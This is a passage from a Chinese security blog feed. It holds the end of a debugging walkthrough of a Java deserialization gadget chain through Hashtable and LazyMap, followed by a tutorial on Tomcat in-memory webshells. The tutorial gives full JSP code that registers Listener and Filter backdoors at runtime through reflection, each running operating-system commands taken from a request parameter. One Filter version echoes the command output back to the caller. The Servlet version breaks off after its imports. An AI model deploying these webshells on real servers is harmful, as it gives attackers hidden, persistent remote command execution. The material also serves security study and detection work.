![](https://s3.hedgedoc.org/demo/uploads/3f84a074-b0fc-422b-9460-f69efbc1e12a.png)

这里直接在demo中readObject处打一个断点进行调试，因为demo中序列化的是一个Hashtable对象，所以调用链从Hashtable.readObject()开始

![](https://s3.hedgedoc.org/demo/uploads/1afc1052-72b0-41c0-bed4-d27f62f850f2.png)
## 调用链
1. Hashtable.readObject()
2. Hashtable.reconstitutionPut()
3. AbstractMapDecorator.equals()
4. AbstractMap.equals()
5. LazyMap.get()

### Hashtable.readObject()
在Hashtable.readObject()打一个断点，然后调试

![](https://s3.hedgedoc.org/demo/uploads/ef37f268-41ef-49fc-86a7-7c14cae2e189.png)

这里elements（对象）有是2，代表有两个元素

这是因为demo中把两个LazyMap对象给封装到了Hashtable对象中

![](https://s3.hedgedoc.org/demo/uploads/1b4c5cc1-eb02-4c56-99d5-51ebc18ef14a.png)

继续向下分析

![](https://s3.hedgedoc.org/demo/uploads/7ed6da7e-f960-402d-85cd-bf33fa8f1db8.png)

首先第一个元素的key是一个LazyMap对象，他的key是yy，这里对应的是lazyMap1，继续调试

![](https://s3.hedgedoc.org/demo/uploads/676bba9d-14cd-4f94-a038-9e2820c7556a.png)

第二个元素的也是一个LazyMap对象，他的key是zZ，这里对应的是lazyMap1

最后都会将key和value传入reconstitutionPut()方法

![](https://s3.hedgedoc.org/demo/uploads/cf44d58d-f6f9-4642-92ad-eff0e2484dd9.png)

### Hashtable.reconstitutionPut()
在Hashtable.reconstitutionPut()打一个断点，然后调试

![](https://s3.hedgedoc.org/demo/uploads/0811e98a-e67b-489e-970b-78de998241ab.png)

首先这里传入的key，是lazyMap1

这里先是计算了key（lazyMap1）的hash为3873，然后计然后计算了hash在tab中的位置

但是tab[index]并没有值，因为此时tab里面没有任何元素，为null

![](https://s3.hedgedoc.org/demo/uploads/f3d885e5-7c64-4ddf-971f-ac5b2eadbbe0.png)

所以e为null，不会进入for循环，而是进入到后面1248行的代码逻辑

![](https://s3.hedgedoc.org/demo/uploads/af61dcfc-8902-4834-8c1e-3d64dba9543a.png)

先把tab[index]（null）赋值给e

然后将计算出来的hash、key和其他的变量value、e给传入到tab[index]进行赋值

我们继续调试

后面再一次进入了reconstitutionPut()方法，此时传入的key是lazyMap2

![](https://s3.hedgedoc.org/demo/uploads/a73959be-d9ab-40c2-8304-d7cc1fe67af6.png)

而key的hash和第一次进入reconstitutionPut()计算的hash一样，都是3873，所以他们在tab中的位置是一样的

又因为第一次进入reconstitutionPut()时候给tab[index]赋值了，所以这次就会进入for循环

![](https://s3.hedgedoc.org/demo/uploads/5a246600-4064-4a7f-b374-c52affd06220.png)

此时e就是tab[index]，tab[index]的key就是lazyMap1

而且这里还将key（LazyMap2）传给了e.key（LazyMap）.equals()

![](https://s3.hedgedoc.org/demo/uploads/255be8a8-d269-4b89-993f-a9caba70b8d1.png)

所以接下来得跟进LazyMap.equals()

### AbstractMapDecorator.equals()
这里有个问题，按道理说在调用链里面，应该是触发LazyMap.equals()，为什么后面的是触发AbstractMapDecorator.equals()方法？

因为AbstractMapDecorator是LazyMap的父类

![](https://s3.hedgedoc.org/demo/uploads/e957ff1d-1938-43d6-9c93-5979ac6788c3.png)

LazyMap既然继承于AbstractMapDecorator，那AbstractMapDecorator的方法和成员变量LazyMap理应也一并继承了的，LazyMap不存在equals()方法，但是他的父类AbstractMapDecorator有，所以就调用AbstractMapDecorator.equals()

我们在AbstractMapDecorator.equals()打个断点，继续调试分析

![](https://s3.hedgedoc.org/demo/uploads/602e2561-d918-4c61-84cb-f09e56e30f95.png)

这里首先判断传入的Object对象object是否是当前对象，如果是，就返回true

但是这里当前对象是lazyMap1，而传入的是lazyMap2，所以就进入129行的代码，调用了map.equals(object)

![](https://s3.hedgedoc.org/demo/uploads/08dc1020-5225-4dbc-9e3a-f62d01e5fb23.png)

此时的成员变量map，是一个HashMap对象

对应的赋值是在demo中将给lazyMap1赋值的时候

![](https://s3.hedgedoc.org/demo/uploads/18e42de7-0dcb-48b2-bc95-94ff69fa0f3d.png)

所以接下来得跟进HashMap.equals()

### AbstractMap.equals()
和LazyMap.equals()的情况一模一样，HahsMap没有equals()方法，所以这里也是调用HashMap父类AbstractMap的equals()方法

![](https://s3.hedgedoc.org/demo/uploads/a6a56858-7cb5-4578-8b5a-32fd09d55d90.png)

在AbstractMap.equals()那里打个断点继续调试

![](https://s3.hedgedoc.org/demo/uploads/1e7e1b7b-fc02-4989-a465-76b741528462.png)

这里equals()传入的Object对象o是lazyMap2

在代码第481行时，将o赋值给Map对象m（对象m就成了LazyMap对象）

在代码第495行时，调用了m.get()方法（相当于调用了LazyMap.get()方法），此时的key是yy

继续跟进LazyMap.get()方法

### LazyMap.get()
在LazyMap.get()打个断点，继续调试

![](https://s3.hedgedoc.org/demo/uploads/a7099be0-e86f-43dc-8d95-1fa1e5b7d0e7.png)

这里先会判断传入的key是否在成员变量map中，此时传入的key是“yy”，成员变量map是“zZ->1”，yy不在map中，所以会进入if语句中，成功进入到157行，成功触发factory.transform(key)，即后续的命令执行链

![](https://s3.hedgedoc.org/demo/uploads/3b039944-4cb0-4605-8a39-231ef1790d04.png)

成功弹出计算器

## 其他代码

### fakeTransformer
![](https://s3.hedgedoc.org/demo/uploads/4a09d3b8-7e53-47d1-8e0b-21f9a98e313a.png)

这里设置fakeTransformer的原因很简单，因为在hashtable.put()方法的时候，会调用LazyMap.get()方法

这里直接在hashtable.put()中打个断点调试

![](https://s3.hedgedoc.org/demo/uploads/113d0f52-d52e-48ba-b2c9-a6a179bed460.png)

这样在没有反序列化的时候，就触发了命令执行，后续反序列化的时候就无法触发命令执行链了，不符合我们的预期，所以得先设置一个空的命令执行链，以免在调用hashtable.put()的时候触发命令执行

当然，在调用完hashtable.put()后，需要将空的Transformer数组对象换成能调用命令的Transformer数组对象

demo中用的是将Transformer数组对象封装进ChainedTransformer对象中的，也就是赋值给成员iTransformers的

![](https://s3.hedgedoc.org/demo/uploads/c135cce7-9626-4ac3-b99c-65bba1fb6442.png)

而成员变量iTransformers是用private修饰的，所以需要用反射修改

![](https://s3.hedgedoc.org/demo/uploads/caf479cb-f6ef-438d-b023-88088cbdd4b3.png)

### lazyMap2.remove("yy"); 
![](https://s3.hedgedoc.org/demo/uploads/08f9940d-bb92-4ae7-badc-0e130485ef0b.png)

为什么要移除lazyMap2中的键对“yy”，因为在调用hashtable.put(lazyMap2, "test");的时候，就会再添加一个yy->yy

![](https://s3.hedgedoc.org/demo/uploads/2b5ed482-619a-43e4-bed6-bac74224fae5.png)

这样会影响AbstractMap.equals()调用链的调用过程，不会进入LazyMap.get()链中

![](https://s3.hedgedoc.org/demo/uploads/1b8fa5ad-aa80-4496-acf9-f0f4eba5adfb.png)

所以需要在demo代码中将“yy->yy”去掉

## 学习
https://xz.aliyun.com/t/9409

https://zhuanlan.zhihu.com/p/647418911

https://cloud.tencent.com/developer/article/1809858









]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马</title>
    <url>/2023/08/22/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[# 1、前言
Listener、Filter只是Servlet的一种扩展机制，在web.xml中配置，在Context容器中进行管理的，而Context容器在初始化的时候，都会有一个ContextConfig对象，这个对象主要就是用来初始化获取关于Context的配置，其中就包括了Listener、Filter、Servlet的配置

学点前置知识，学内存马事半功倍：https://blog.csdn.net/weixin_41835612/category_10674061.html

加载三个Java Web组件的加载顺序是Listen>Filter>Servlet，体现在StandardContext.startInternal()方法中

![](https://s3.hedgedoc.org/demo/uploads/b9111a62-8ea4-4b70-b4c2-6d4c33526a4c.png)

![](https://s3.hedgedoc.org/demo/uploads/2ec66c8d-a0a2-499b-b789-5654939bfb03.png)

![](https://s3.hedgedoc.org/demo/uploads/9b5394e8-175b-4575-ba71-031258d95b9e.png)

# 2、Listener内存马
## 2.1、简述
这里首先讲Listener内存马，因为在 Java Web 应用程序中，Listener 没有路径映射表的概念，只需要添加到Listener集合中即可，比较简单

而在所有的Listener类型中，监听Servlet请求的ServletRequestListener 监听器是需要监听所有的请求的，也就是说，只要有请求，都会触发ServletRequestListener.requestInitialized()方法

所以ServletRequestListener类型的监听器做内存马最适合不过
## 2.2、编写一个Listener
首先写一个Listener，然后在web.xml中配置

```
\\Listener

package com.tomcatd0.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

public class MyListener implements ServletRequestListener {

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String commad = request.getParameter("listener_cmd");
        if(commad != null) {
            try {
                Runtime.getRuntime().exec(commad);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }
}

```

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <listener>
        <listener-class>com.tomcatd0.listener.MyListener</listener-class>
    </listener>
    
</web-app>

```

![](https://s3.hedgedoc.org/demo/uploads/c3623664-bd6c-4c95-905f-fe0b87b51bfc.png)
成功弹出计算器
## 2.3、调用链分析
在requestInitialized()方法边上打个断点

![](https://s3.hedgedoc.org/demo/uploads/26266cf9-b374-4ee7-94d6-f77097a301d1.png)

开启调试，调用链如下：

![](https://s3.hedgedoc.org/demo/uploads/b5053ba3-f913-4acc-86b1-92810c3ef60e.png)

这里进入了StandardContext.fireRequestInitEvent()方法，可以看到，第3724行有Listener调用了requestInitialized()方法

![](https://s3.hedgedoc.org/demo/uploads/f0a03b5c-fe27-489b-a84d-c60d6c7679bd.png)

代码一个一个往上跟，这个Listener来自3712行中的StandardContext.getApplicationEventListeners()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/2a10f1ce-60bb-42c6-8b48-1a9103f6ac5a.png)

由上图可见，StandardContext.getApplicationEventListeners()方法又调用了StandardContext.applicationEventListenersList这个成员变量，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/f4fa953a-b9ff-408d-b875-0fbf5c97c721.png)

StandardContext.applicationEventListenersList这个成员变量就是个列表，里面装着的正是我们的MyListener

至此，就清楚了Listener是咋被调用的了
1. 从StandardContext.applicationEventListenersList找到Listener
2. 调用StandardContext.fireRequestInitEvent()，触发MyListener.requestInitialized()方法
## 2.4、动态注册Listener实现内存马
我们要动态注册Listener的话，只有向StandardContext.applicationEventListenersList里面添加Listener，这样才能被调用到

现在我们在StandardContext类中搜索“this.applicationEventListenersList”，看看有啥方法可以向里面添加Listener的

![](https://s3.hedgedoc.org/demo/uploads/478edf37-5fdd-40ac-bd2c-31a0f6b88b35.png)

第635行的addApplicationEventListener()方法符合这个条件，那么可以直接写代码了，代码逻辑如下
1. 写一个Listener，然后new一个对象
2. 获取到一个StandardContext对象
3. 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象


完整jsp代码如下：
```
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%-- 写一个Listener，然后new一个对象 --%>
<%
    class MyListener implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String commad = request.getParameter("listener_cmd");
            if(commad != null) {
                try {
                    Runtime.getRuntime().exec(commad);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }

    MyListener myListener = new MyListener();
%>

<%-- 获取到一个StandardContext对象 --%>
<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%-- 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象 --%>
<%
    standardContext.addApplicationEventListener(myListener);
%>
```

## 2.5、验证
在web.xml中没有添加Listener的情况下，输入路由?listener_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/91744b09-dfea-4914-9c81-b8159aef8600.png)

没有弹出记事本，毫无反应

访问实现动态注册的jsp

![](https://s3.hedgedoc.org/demo/uploads/66b215bf-e168-4283-94ab-817b33e6ca00.png)

再次输入路由?listener_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/b7d8efbb-6167-4dba-9743-f5f4fdef0471.png)

成功弹出记事本

# 3、Filter内存马
## 3.1、简述
Filter是一种Servlet的扩展机制，在web.xml中配置，在Context容器中进行管理，主要用于对请求和响应进行预处理和后处理的组件

![](https://s3.hedgedoc.org/demo/uploads/0a498d44-9824-45d6-81ce-b82eb18f9769.png)

主要是存储在StandardContext.filterDefs这个成员变量中的
## 3.2、编写一个Filter
首先写一个Filter，然后在web.xml中配置

```
package com.tomcatd0.filter;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MyFilter1 implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("filter_cmd");
        if (command != null){
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }

            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
```

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <filter>
        <filter-name>MyFilter</filter-name>
        <filter-class>com.tomcatd0.filter.MyFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>MyFilter</filter-name>
        <url-pattern>/myfilter</url-pattern>
    </filter-mapping>
    
</web-app>
```
可以看到，Filter在web.xml的配置和Listener不一样，多了个路由

![](https://s3.hedgedoc.org/demo/uploads/9f9ce15e-f44d-41b6-b52d-078d1b6d5485.png)

成功弹出计算器
## 3.3、调用链分析
在doFilter()方法边上打个断点

![](https://s3.hedgedoc.org/demo/uploads/a0777783-9e84-49ea-928e-e1173212f233.png)

开启调试，调用链如下：

![](https://s3.hedgedoc.org/demo/uploads/fce0d2db-6695-4204-90a0-a967d0ca1731.png)

这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第92行有Filter调用了doFilter()方法

![](https://s3.hedgedoc.org/demo/uploads/421c0023-95fc-477e-8fe2-c32676f39cad.png)

这个Listener来自ApplicationFilterChain.filters这个成员变量，我们跟进ApplicationFilterChain.filters

![](https://s3.hedgedoc.org/demo/uploads/981d0bdc-6726-433f-b147-08ce0dfc1c52.png)

ApplicationFilterChain.filters是一个元素为ApplicationFilterConfig对象的数组，可以看到数组中含有我们写的MyFilter

这里我们搜索关键字“this.filters”，看看哪里可以是否有添加元素的方法

145行的ApplicationFilterChain.addFilter()方法可以向filters添加元素

![](https://s3.hedgedoc.org/demo/uploads/aa80f199-c938-4726-99bf-48885def1db3.png)

这个方法先对现在的filters进行遍历，将传入的ApplicationFilterConfig对象与filters中的ApplicationFilterConfig对象进行对比，如果想等，则直接跳出循环（149-152行）；如果不想等，则先判断此时的n的长度和filers的长度是否相同，如果相同，则将filters的长度扩大10，最后将传入的ApplicationFilterConfig对象添加到filtrs中，同时n增长1

其实就是判断添加进的ApplicationFilterConfig对象是否重复，并且在添加时候判断filters满了没，满了就扩大10个位置，免得ApplicationFilterConfig对象装不进去

但是值得注意的是，这里的ApplicationFilterChain.filters最开始里面并没有元素（new ApplicationFilterConfig[0];），也就是说并没有Filter对象，而这里却包含了我们的MyFilter，说明给filters添加元素的方法在后面的调用链中

所以在后面的调用链中重点关注“ApplicationFilterChain”和“addFilter”

继续调试跟进，在进入StandardWrapperValve.invoke()方法时候，创建了一个ApplicationFilterChain对象filterChain，是通过ApplicationFilterFactory.createFilterChain()方法获取到的

![](https://s3.hedgedoc.org/demo/uploads/866f58ce-6776-490d-ae52-b57867362cb9.png)

跟进ApplicationFilterFactory.createFilterChain()方法，发现第64行调用了ApplicationFilterChain.addFilter()方法

![](https://s3.hedgedoc.org/demo/uploads/1f8a5cb0-7240-40a8-a450-adda06ad2529.png)

![](https://s3.hedgedoc.org/demo/uploads/32fdeec6-a9fa-4b6e-aa77-1a2f8387e1f6.png)

这里稍微分析一下
1. 从Wrapper对象中获取到StandardContext对象
2. 从StandardContext对象获取到FilterMaps对象
3. 遍历FilterMaps对象获取FilterMap对象
4. 判断请求中的路由和FilterMap对象中设置的路由是否想等，同时判断请求中的调度器与FilterMap对象中设置的调度器（dispatcherMapping）是否相同
5. 如果相同，就将FilterMap对象的FilterName传入到StandardContext.getFilterConfig()方法中获取到FilterConfig对象，接着再强转为ApplicationFilterConfig对象
6. 最后将ApplicationFilterConfig对象通过ApplicationFilterChain.addFilter()方法加入到filters中

从流程可以看出，FilterMap是一个存储Filter映射规则的对象

这里6个流程中，第5个流程有点复杂

我们先跟进到StandardContext.getFilterConfig()方法

![](https://s3.hedgedoc.org/demo/uploads/d8580a34-e40d-4dff-a919-6e9ccd9eb339.png)

这么看来，FilterConfig对象其实就是从StandardContext.filterConfigs这个成员变量中获取

跟进StandardContext.filterConfigs

![](https://s3.hedgedoc.org/demo/uploads/469d1f09-334d-48b6-add6-74432be2c220.png)

StandardContext.filterConfigs是一个HashMap对象，用键、值的方式存储，所以StandardContext.getFilterConfig()方法就是通过键（filterName）获取到ApplicationFilterConfig对象

String类型的filterName好解决，但是ApplicationFilterConfig的创建就难了，我们跟进到ApplicationFilterConfig的构造函数

![](https://s3.hedgedoc.org/demo/uploads/73519be3-7a48-4f5b-922c-e9a934d24020.png)

构造函数没有用public修饰，所以只能反射获取ApplicationFilterConfig对象，而且ApplicationFilterConfig需要用到FilterDef对象

我们直接在ApplicationFilterConfig的构造函数那里打个断点，然后调试，看看初始化的时候FilterDef对象中有啥

![](https://s3.hedgedoc.org/demo/uploads/3c2b90fa-cac3-4ea4-92cc-143fe3b8fd30.png)

可以看到，此时的FilterDef对象中，设置了filter、filterClass、filterName、asyncSupported四个属性

1. filter就是Filter对象
2. filterClass就是Filter对象的class
3. filterName就是Filter对象的名称
4. asyncSupported不知道是啥，照葫芦画瓢也设置成"true"
## 3.4、动态注册Filter实现内存马
综上所述，想要将我们的Filter加入到StandardContext.filters中，代码逻辑如下：
1. 写一个Filter
2. 获取到一个StandardContext对象
3. 创建一个FilterDef对象
  a. 设置FilterDef.filterName
  b. 设置FilterDef.filterClass
  c. 设置FilterDef.filter
  d. 设置FilterDef.asyncSupported
4. 将FilterDef对象加入到StandardContext.filterDefs中
5. 创建一个FilteMap对象
  a. 设置FilteMap.FilterName
  b. 设置FilteMap.urlPatterns
  c. 设置FilteMap.dispatcherMapping
6. 将FilteMap对象加入到StandardContext.FilterMaps中
7. 通过StandardContext和FilterDef两个对象，反射创建一个ApplicationFilterConfig对象
8. ApplicationFilterConfig对象(filter对象)通过HashMap.put()方法加入进StandardContext.filterConfigs中

完整jsp代码如下
```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%-- Filter --%>
<%
    class MyFilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String commmand = servletRequest.getParameter("filter_cmd");
            if(commmand != null) {
                try {
                    Runtime.getRuntime().exec(commmand);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        @Override
        public void destroy() {
        }
    }

    MyFilter myFilter = new MyFilter();
    String filterName = "lan";
%>

<%-- 获取到StandardContext对象 --%>
<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%-- 创建一个FilterDef对象 --%>
<%
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(myFilter.getClass().getName());
    filterDef.setFilter(myFilter);
    filterDef.setAsyncSupported("true");
%>

<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
<%
    standardContext.addFilterDef(filterDef);
%>

<%-- 创建一个FilteMap对象 --%>
<%
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/myfilter");
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
%>

<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
<%
    standardContext.addFilterMap(filterMap);
%>

<%-- 获取到ApplicationFilterConfig对象 --%>
<%
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
%>

<%-- 将filter添加到filterConfigs中 --%>
<%
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
    filterConfigs.put(filterName,filterConfig);
%>

```

顺便说一嘴，将FilteMap对象加入到StandardContext.FilterMaps中时候，可以用StandardContext.addFilterMapBefore()方法，这个方法的作用是将Filter对象添加到链条的第一位，也就是每次触发filter时候都是优先我们的链条
## 3.5、验证
在web.xml中没有添加Filter的情况下，输入路由/myfilter?filter_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/235cca7d-a65e-4c99-a95f-ca722b64e7b3.png)

没有弹出记事本，毫无反应

访问实现动态注册的MyFilter.jsp

![](https://s3.hedgedoc.org/demo/uploads/15bd2a17-3aac-42c7-9ffb-6f8fdfde1817.png)

再次访问路由/myfilter?filter_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/ea09c2c0-3183-4dc6-9819-a40672f2b6a8.png)

成功弹出记事本
# 4、Servlet内存马
## 4.1、简述
Servlet主要用于处理请求并生成响应，因此其主要作用是在Web应用程序中实现服务器端的业务逻辑。

而Servlet是封装在Wrapper中，每一个Servlet都对应了一个Wrapper，当请求从Context向特定的Wrapper发送时，其实就是向Servlet发送，所以，也可以将Wrapper看作是一个Servlet
## 4.2、编写一个Servlet
首先写一个Servlet，然后在web.xml中配置

```
package com.tomcatd0.servlet;

import javax.servlet.*;
import java.io.IOException;

public class MyServlet implements Servlet {

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        String commmand = servletRequest.getParameter("servlet_cmd");
        if(commmand != null) {
            try {
                Runtime.getRuntime().exec(commmand);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}

```

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <servlet>
        <servlet-name>MyServlet</servlet-name>
        <servlet-class>com.tomcatd0.servlet.MyServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>MyServlet</servlet-name>
        <url-pattern>/myservlet</url-pattern>
    </servlet-mapping>

</web-app>
    

```

访问路由：/myservlet?servlet_cmd=calc

成功弹出计算器
## 4.3、调用链分析
在service()方法边上打个断点

![](https://s3.hedgedoc.org/demo/uploads/6aa7d808-a3ce-44de-a38e-e25692f95618.png)

开启调试，调用链如下：

![](https://s3.hedgedoc.org/demo/uploads/3477af1c-ff6c-41e7-b0a3-882cce2a46cb.png)

这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第118行有Servlet对象调用了service()方法，后面我们需要关注这个Servlet对象咋来的

![](https://s3.hedgedoc.org/demo/uploads/4137f19e-2f35-418b-a013-b12c2c0bf247.png)

跟进一下this.service，可以看到，ApplicationFilterChain.service没有初始化（值为null），我们搜一下关键字“this.servlet”看看有哪个方法可以给他赋值的

![](https://s3.hedgedoc.org/demo/uploads/361184fe-6d4a-4758-a3e5-5a31eef76a8f.png)

180行的ApplicationFilterChain.setServlet()方法可以，那么后面我们就注意看看哪条链调用了ApplicationFilterChain.setServlet()方法，主要是注意关键字“ApplicationFilterChain”和“setServlet(”

![](https://s3.hedgedoc.org/demo/uploads/8255f30e-c2e7-4137-82f8-d513dc884ca6.png)

这里跟进到了StandardWrapperValve.invoke()方法，第97行实例化了个ApplicationFilterChain，跟进ApplicationFilterFactory.createFilterChain()方法

![](https://s3.hedgedoc.org/demo/uploads/09c3f4c2-de2f-4f82-a4b6-a6aaa6d3a77f.png)

在ApplicationFilterFactory.createFilterChain()方法中，第40行调用了ApplicationFilterChain.setServlet()方法，我们跟进一下它的参数servlet

![](https://s3.hedgedoc.org/demo/uploads/7e75690c-6421-487e-99c7-6948a7137c0f.png)

确认到是传参传入的servlet，我们又需要回到StandardWrapperValve.invoke()方法，因为是StandardWrapperValve.invoke()方法中调用了ApplicationFilterFactory.createFilterChain()方法的

![](https://s3.hedgedoc.org/demo/uploads/8891ed1e-3507-45b6-9fd4-4e1c3d546190.png)

我们跟进下StandardWrapperValve.invoke()方法中第98行传入的servlet，看看servlet咋来的

![](https://s3.hedgedoc.org/demo/uploads/cbf934e2-4d38-4f97-9648-4ee173d8c54e.png)

这里的servlet也是没有初始化的，继续往下面看代码

![](https://s3.hedgedoc.org/demo/uploads/bd116cd1-d006-4152-92a9-c4fa78386ec1.png)

第65行有一个if条件，此时unavailable是false，!false=true，所以进入到了servlet = wrapper.allocate();，我们可以知道，servlet来自StandardWrapper.allocate()方法，我们跟进StandardWrapper.allocate()

![](https://s3.hedgedoc.org/demo/uploads/c885a5f2-f020-4ac2-a7d9-667ab7167d70.png)

下面我们对StandardWrapper.allocate()方法进行分析

![](https://s3.hedgedoc.org/demo/uploads/4dd45e97-6da0-4dcf-a91e-7e7c7c302f71.png)

根据StandardWrapper的属性和StandardWrapper.allocate()方法的代码逻辑，最终会走到337行的代码，看上面的图，this.instance其实就一个Servlet对象

不过有意思的来了，代码第331行有两条路可以走，如果this.instance还没有初始化（==null），那就会走到第337行进行初始化；如果已经初始化了（!=null），那就直接返回Servlet

![](https://s3.hedgedoc.org/demo/uploads/33b58178-d62a-4410-94af-badca7390972.png)

作为一条懒狗，少一事不如多一事，我们搜一下关键字“this.instance”看看有没有直接可以初始化的函数

第247行StandardWrapper.setServlet()方法满足这个条件

![](https://s3.hedgedoc.org/demo/uploads/6d07ec33-0c1c-421a-b6d7-791c25815814.png)

ok，Servlet知道是咋可以搞的了，所以我们只需要将Wrapper装入StandardContext中，然后正常触发就完成了

因为组件都是继承于ContainerBase这个抽象类，所以都会用父组件的addChild()方法将子组件添加到父组件中

这里我们跟进到StandardContext.addChild()方法

![](https://s3.hedgedoc.org/demo/uploads/49d69119-80dd-44b3-8e5c-caa21f12a683.png)

首先会通过Servlet名字判断这个Servlet是否为jsp（红框1），如果不是，就将child（StandardWrapper）添加到StandardContext中（红框2），然后再给这个child添加一个路由映射（红框3）
## 4.4、动态注册Servlet实现内存马
综上所述，想要将我们的Servlet动态注册，代码逻辑如下：
1. 写一个Servlet
2. 获取一个StandardContext
3. 获取一个StandardWrapper对象
4. 将StandardWrapper加入到StandardContext
5. 设置StandardWrapper路由映射
完整jsp代码如下：
```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
